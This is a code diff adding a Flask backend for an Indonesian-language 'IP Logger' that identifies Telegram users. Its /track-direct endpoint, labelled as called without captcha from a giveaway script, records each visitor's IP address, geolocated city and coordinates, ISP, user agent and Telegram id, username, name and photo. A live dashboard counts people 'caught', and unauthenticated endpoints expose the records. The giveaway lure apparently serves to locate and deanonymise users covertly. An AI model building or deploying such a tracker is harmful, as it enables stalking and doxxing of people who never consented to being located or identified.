@@ -1,3 +1,17 @@
+from flask import Blueprint, request, jsonify, render_template_string
+import requests
+from datetime import datetime
+import sys
+from pathlib import Path
+
+ROOT_DIR = Path(__file__).parent.parent
+sys.path.insert(0, str(ROOT_DIR))
+
+from database.cek_ip import CekIpDatabase
+
+cek_ip_bp = Blueprint('cek_ip', __name__, url_prefix='/api/cek-ip')
+db = CekIpDatabase()
+
 DASHBOARD_HTML = '''
 <!DOCTYPE html>
 <html lang="id">
@@ -60,7 +74,6 @@ DASHBOARD_HTML = '''
         .live-dot { animation: blink 1s infinite; color: #ff4444; }
         .time-cell { font-size: 11px; color: #888; white-space: nowrap; }
         .device-cell { font-size: 10px; color: #666; max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
-
         @media (max-width: 768px) {
             .stats { flex-direction: column; }
             table { font-size: 11px; }
@@ -76,7 +89,6 @@ DASHBOARD_HTML = '''
             Real-time IP Logger dengan Identifikasi User Telegram |
             Total Tertangkap: <strong>{{ stats.total }}</strong> <span class="live-dot">● LIVE</span>
         </div>
-
         <div class="stats">
             <div class="stat-card">
                 <h3><i class="fas fa-globe"></i> Total Captures</h3>
@@ -95,11 +107,9 @@ DASHBOARD_HTML = '''
                 <div class="number">{{ stats.today_count }}</div>
             </div>
         </div>
-
         <button class="refresh-btn" onclick="location.reload()">
             <i class="fas fa-sync-alt"></i> Refresh Data
         </button>
-
         <table>
             <thead>
                 <tr>
@@ -117,9 +127,7 @@ DASHBOARD_HTML = '''
                 <tr>
                     <td>{{ loop.index }}</td>
                     <td class="time-cell">{{ item.created_at[:16] if item.created_at else '-' }}</td>
-                    <td>
-                        <span class="ip-cell">{{ item.ip }}</span>
-                    </td>
+                    <td><span class="ip-cell">{{ item.ip }}</span></td>
                     <td>
                         <span class="location-badge">
                             <i class="fas fa-map-marker-alt" style="color: #ff4444;"></i>
@@ -171,11 +179,141 @@ DASHBOARD_HTML = '''
             </tbody>
         </table>
     </div>
-
     <script>
-        // Auto refresh setiap 30 detik
         setTimeout(() => location.reload(), 30000);
     </script>
 </body>
 </html>
 '''
+
+@cek_ip_bp.route('/dashboard')
+def dashboard():
+    """Halaman dashboard untuk melihat data tracking IP"""
+    print(f"[CEK-IP] Dashboard accessed from {request.remote_addr}")
+    data = db.get_all_ip_tracking(limit=200)
+    stats = db.get_statistics()
+    return render_template_string(DASHBOARD_HTML, data=data, stats=stats)
+
+@cek_ip_bp.route('/track', methods=['POST'])
+def track_ip():
+    """Endpoint untuk tracking IP (dengan data Telegram user)"""
+    try:
+        req_data = request.get_json()
+        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+        ua = request.headers.get('User-Agent', 'Unknown')
+        
+        # Lookup IP
+        try:
+            geo = requests.get(f'http://ip-api.com/json/{ip}', timeout=5).json()
+        except:
+            geo = {'country': 'Unknown', 'city': 'Unknown', 'lat': 0, 'lon': 0, 'isp': 'Unknown'}
+        
+        # Data dari Telegram WebApp
+        user = req_data.get('user', {})
+        user_id = user.get('id')
+        username = user.get('username', '')
+        first_name = user.get('first_name', '')
+        last_name = user.get('last_name', '')
+        photo_url = user.get('photo_url', '')
+        
+        entry = {
+            'ip': ip,
+            'country': geo.get('country', 'Unknown'),
+            'city': geo.get('city', 'Unknown'),
+            'lat': geo.get('lat', 0),
+            'lon': geo.get('lon', 0),
+            'isp': geo.get('isp', 'Unknown'),
+            'user_agent': ua,
+            'user_id': user_id,
+            'username': username,
+            'first_name': first_name,
+            'last_name': last_name,
+            'photo_url': photo_url
+        }
+        
+        db.save_ip_tracking(entry)
+        print(f"[IP Track] {ip} - {geo.get('city')}, {geo.get('country')} - User: {first_name} (@{username})")
+        
+        return jsonify({'success': True, 'message': 'IP tracked successfully'})
+    except Exception as e:
+        print(f"[IP Track Error] {e}")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@cek_ip_bp.route('/track-direct', methods=['POST'])
+def track_ip_direct():
+    """Endpoint tracking langsung TANPA CAPTCHA — dipanggil dari giveaway.js"""
+    try:
+        req_data = request.get_json()
+        user = req_data.get('user', {})
+        geo = req_data.get('geo', {})
+        ua = req_data.get('user_agent', 'Unknown')
+        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+        
+        if geo.get('ip') and geo.get('ip') != 'unknown':
+            city = geo.get('city', 'Unknown')
+            country = geo.get('country', 'Unknown')
+            lat = geo.get('lat', 0)
+            lon = geo.get('lon', 0)
+            isp = geo.get('isp', geo.get('org', 'Unknown'))
+        else:
+            try:
+                geo_lookup = requests.get(f'http://ip-api.com/json/{ip}', timeout=5).json()
+                city = geo_lookup.get('city', 'Unknown')
+                country = geo_lookup.get('country', 'Unknown')
+                lat = geo_lookup.get('lat', 0)
+                lon = geo_lookup.get('lon', 0)
+                isp = geo_lookup.get('isp', 'Unknown')
+            except:
+                city = country = 'Unknown'
+                lat = lon = 0
+                isp = 'Unknown'
+        
+        user_id = user.get('id')
+        username = user.get('username', '')
+        first_name = user.get('first_name', '')
+        last_name = user.get('last_name', '')
+        photo_url = user.get('photo_url', '')
+        
+        entry = {
+            'ip': ip,
+            'country': country,
+            'city': city,
+            'lat': lat,
+            'lon': lon,
+            'isp': isp,
+            'user_agent': ua,
+            'user_id': user_id,
+            'username': username,
+            'first_name': first_name,
+            'last_name': last_name,
+            'photo_url': photo_url
+        }
+        
+        db.save_ip_tracking(entry)
+        print(f"[IP Track Direct] {ip} - {city}, {country} - User: {first_name} (@{username})")
+        
+        return jsonify({
+            'success': True,
+            'message': 'IP tracked successfully',
+            'data': {'ip': ip, 'location': f'{city}, {country}'}
+        })
+    except Exception as e:
+        print(f"[IP Track Direct Error] {e}")
+        import traceback
+        traceback.print_exc()
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@cek_ip_bp.route('/user/<int:user_id>')
+def get_user_ips(user_id):
+    data = db.get_ip_tracking_by_user(user_id)
+    return jsonify({'success': True, 'user_id': user_id, 'total': len(data), 'data': data})
+
+@cek_ip_bp.route('/ip/<ip>')
+def get_ip_info(ip):
+    data = db.get_ip_tracking_by_ip(ip)
+    return jsonify({'success': True, 'ip': ip, 'total': len(data), 'data': data})
+
+@cek_ip_bp.route('/stats')
+def get_stats():
+    stats = db.get_statistics()
+    return jsonify({'success': True, 'stats': stats})
